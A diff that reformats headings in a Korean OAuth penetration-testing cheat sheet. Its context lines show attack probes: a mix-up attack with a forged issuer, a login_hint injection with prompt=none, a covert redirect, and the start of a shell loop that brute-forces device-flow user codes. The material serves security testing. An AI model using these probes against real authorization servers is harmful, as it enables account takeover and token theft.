@@ -57,27 +57,27 @@ GET /authorize?response_type=token&client_id=X&redirect_uri=...
 # fragment에 access_token 노출 시 → IMPLICIT 잔존
 ```
 
-**Mix-up attack (다중 IdP):**
+#### Mix-up attack (다중 IdP)
 ```
 # 다중 IdP 환경에서 IdP 응답을 다른 IdP로 속임
 GET /callback?code=...&iss=https://OTHER_IDP.com&state=...
 # iss 검증 누락 시 다른 IdP의 코드를 본 IdP 코드로 처리
 ```
 
-**Authorization endpoint 파라미터 인젝션:**
+#### Authorization endpoint 파라미터 인젝션
 ```
 # prompt=none + login_hint 인젝션
 GET /authorize?client_id=X&redirect_uri=...&prompt=none&login_hint=victim@x.com
 # 사용자 동의 화면 우회 시도
 ```
 
-**Covert redirect (RFC 6749 §10.15):**
+#### Covert redirect (RFC 6749 §10.15)
 ```
 # 동의 후 redirect_uri fragment에 token 노출
 GET /authorize?response_type=token&client_id=X&redirect_uri=https://allowed.com/cb#evil
 ```
 
-**Device Authorization Grant (RFC 8628) user_code brute force:**
+#### Device Authorization Grant (RFC 8628) user_code brute force
 ```
 # user_code가 짧고 추측 가능 시
 for code in $(seq 100000 999999); do
@@ -85,7 +85,7 @@ for code in $(seq 100000 999999); do
 done
 ```
 
-**Token introspection cache:**
+#### Token introspection cache
 ```
 # 폐기된 토큰이 cache로 유효 유지
 POST /token/revoke  ... (토큰 폐기)
